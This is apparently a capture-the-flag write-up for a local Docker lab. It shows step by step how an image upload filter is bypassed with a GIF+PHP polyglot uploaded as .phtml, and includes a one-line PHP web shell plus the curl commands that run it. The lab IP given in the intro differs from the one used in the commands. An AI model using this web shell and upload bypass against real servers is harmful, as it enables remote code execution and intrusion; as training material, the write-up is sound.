# Evidence Upload

> Field evidence tray. Download the lab zip (Google Drive) and run it on Kali/Linux with Docker.
> `chmod +x startlab.sh` `./startlab.sh blackout-web05.tar`
> The script displays the lab IP (172.18.0.2). Enumerate with nmap and attack via HTTP. Do not expose the container to the internet.
> **Tip:** enumerate the lab IP with nmap. There is a tray for archiving field evidence.

**Flag:** `WHOAMI{up10ad_3v1d3nc14}`

---

## Solution

The lab is a web application with an **evidence tray** (`/carga.php`) that allows uploading the "photo log" of a shift. The challenge revolves around this file upload: if the filter is not properly implemented, it can be turned into remote code execution (RCE).

### 1. Start the lab and enumerate

**Tool:** `docker inspect` + `nmap`. **Why:** obtain the container IP and the services to attack.

**nmap parameters:** `-sV` (service version) and `-p-` (all ports).

```bash
$ sudo docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' blackout-web05
172.17.0.2

$ nmap -sV 172.17.0.2
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.68 (Debian)
```

Only port 80 → the attack is via HTTP.

### 2. Browse the app and locate the upload

The menu shows `/carga.php`, a file upload form:

```html
<form accept="image/post" action="/carga.php" enctype="multipart/form-data">
  <input type="file" name="evidencia" accept="image/">
  <button type="submit">Upload evidence</button>
</form>
```

### 3. Inspect the server-side validation

**Tool:** `docker exec` (container access). **Why:** examine the source code of `carga.php` to understand what it validates before attempting a bypass.

```bash
$ sudo docker exec blackout-web05 cat /var/www/html/carga.php
```

The validation logic:

- Blocks filenames containing `.htaccess` or extensions `php|php3|php4|php5|phar`.
- Requires `Content-Type: image/...` (prefix `image/`).
- Requires the file to pass `getimagesize()` (must be a valid image).

```php
$bloqueada = preg_match('/htaccess/i', $orig) || preg_match('/\.(php|php3|php4|php5|phar)(\.|$)/i', $orig);
if ($orig === '' || $bloqueada || strncmp($ctype, 'image/', 6) !== 0 || @getimagesize($tmp) === false) { ... }
```

### 4. Find the bypass path

**Tool:** review the Apache configuration. **Why:** the blocklist only covers `.php` and variants, but Apache may execute other extensions as PHP depending on its `SetHandler`.

```bash
$ sudo docker exec blackout-web05 cat /etc/apache2/conf-available/zzz-portal.conf
<FilesMatch "\.(phtml|php7|pht)$">
  SetHandler application/x-httpd-php
</FilesMatch>
```

**What I found:** Apache executes `.phtml`, `.php7`, and `.pht` extensions as PHP — **none of which are in the server's blocklist**. The path is to upload a `.phtml` file that is simultaneously a valid image (to pass `getimagesize`) and contains PHP code.

### 5. Create and upload a GIF+PHP polyglot

**Tool:** `python3` + `curl`. **Why:** construct a valid 1×1 GIF (header bytes that `getimagesize` recognizes) and append a PHP payload at the end; when served as `.phtml`, PHP executes it.

```bash
$ python3 -c "
gif = open('/tmp/base.gif','rb').read()
open('/tmp/evidencia.phtml','wb').write(gif + b'<?php system(\$_GET[\"c\"]); ?>')
"
$ file /tmp/evidencia.phtml
GIF image data, version 89a, 1 x 1     # passes getimagesize
```

Upload specifying `type=image/gif`:

```bash
$ curl -F "evidencia=@evidencia.phtml;type=image/gif" http://172.17.0.2/carga.php
<div class="alert">Registro archivado. <a href="/evidencias/evidencia.phtml">Abrir evidencia</a></div>
```

### 6. Execute commands (RCE)

Access the uploaded file with the `c` parameter:

```bash
$ curl "http://172.17.0.2/evidencias/evidencia.phtml?c=id"
uid=33(www-data) gid=33(www-data)
```

**RCE confirmed.** From here I look for the flag.

### 7. Locate and read the flag

**Tool:** `find` / `ls` in typical application paths. **Why:** in previous challenges from this lab, the flag lives in `.dat` files under `/var/lib/latam`.

```bash
$ curl "http://172.17.0.2/evidencias/evidencia.phtml?c=ls /var/lib/latam"
evidencia.dat  nodo.cache  turno.log
```

`evidencia.dat` contains the record with the flag in **base64**:

```bash
$ curl "http://172.17.0.2/evidencias/evidencia.phtml?c=cat /var/lib/latam/evidencia.dat"
REGISTRO=V0hPQU1Je3VwMTBhZF8zdjFkM25jMTR9

$ echo "V0hPQU1Je3VwMTBhZF8zdjFkM25jMTR9" | base64 -d
WHOAMI{up10ad_3v1d3nc14}
```

## Lesson

A file upload that validates `getimagesize()` but does not restrict which extensions Apache executes is vulnerable: `.phtml`/`.php7`/`.pht` are typically not in the blocklist and are interpreted as PHP. A polyglot (valid GIF + PHP payload) combines both requirements and yields RCE.
